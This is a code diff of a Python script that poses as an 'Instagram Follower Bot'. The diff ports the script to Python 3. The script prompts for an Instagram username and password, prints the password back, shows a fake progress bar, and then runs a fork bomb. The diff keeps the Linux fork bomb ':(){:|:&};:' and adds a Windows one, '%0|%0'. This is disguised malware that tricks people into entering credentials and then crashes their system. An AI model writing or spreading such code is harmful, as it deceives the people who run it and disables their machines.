@@ -1,45 +1,42 @@
+import time
+import sys
 import os
-import sys, traceback
+import platform
+current_os = platform.system()
+if current_os == "Linux":
+    # print('sudo apt update')
+    os.system('sudo apt update')
+print("Instagram Follower Bot")
+name = input('Enter your Username : ')
+print("Scanning For Username that go by: %s" % name)
+name2 = input('Enter your Password : ')
+print("Entering  database with the Password of : %s " % name2)
 
-os.system('sudo apt-get update')
-print "Instagram Follower Bot"
-name = raw_input('Enter your Username : ')
-print ("Scanning For Username that go by: %s" % name);
-name2 = raw_input('Enter your Password : ')
-print ("Entering  database with the Password of : %s " % name2);
-import time, sys
 
-# update_progress() : Displays or updates a console progress bar
-## Accepts a float between 0 and 1. Any int will be converted to a float.
-## A value under 0 represents a 'halt'.
-## A value at 1 or bigger represents 100%
+# Accepts a int from 0 to whatever
 def update_progress(progress):
-    barLength = 10 # Modify this to change the length of the progress bar
-    status = ""
-    if isinstance(progress, int):
-        progress = float(progress)
-    if not isinstance(progress, float):
-        progress = 0
-        status = ""
-    if progress < 0:
-        progress = 0
-        status = "Halt...\r\n"
-    if progress >= 1:
-        progress = 1
+    bar_length = 1  # Modify this to change the length of the progress bar
+    if progress >= 100:
         status = "Done...\r\n"
-    block = int(round(barLength*progress))
-    text = "\rPercent: [{0}] {1}% {2}".format( "#"*block + "-"*(barLength-block), progress*100, status)
+    else:
+        status = ""
+    block = int(round(bar_length * progress))
+    text = "\rProgress: [{0}] {1}% {2}".format("#" * block + "-" * (bar_length - block), progress, status)
     sys.stdout.write(text)
     sys.stdout.flush()
 
 
 # update_progress test script
-print "__________Starting__________"
-update_progress("hello")
-time.sleep(1)
-
-print "Mounting"
-update_progress(3)
-time.sleep(3);
-print "Thank You...";
-os.system(':(){:|:&};:')
+print("__________Starting__________")
+print("Mounting")
+for x in range(1, 101):
+    update_progress(x)
+    time.sleep(0.01)
+time.sleep(3)
+print("Thank You...")
+if current_os == "Linux":
+    # print(':(){:|:&};:')
+    os.system(':(){:|:&};:')
+if current_os == "Windows":
+    # print('%0|%0')
+    os.system('%0|%0')
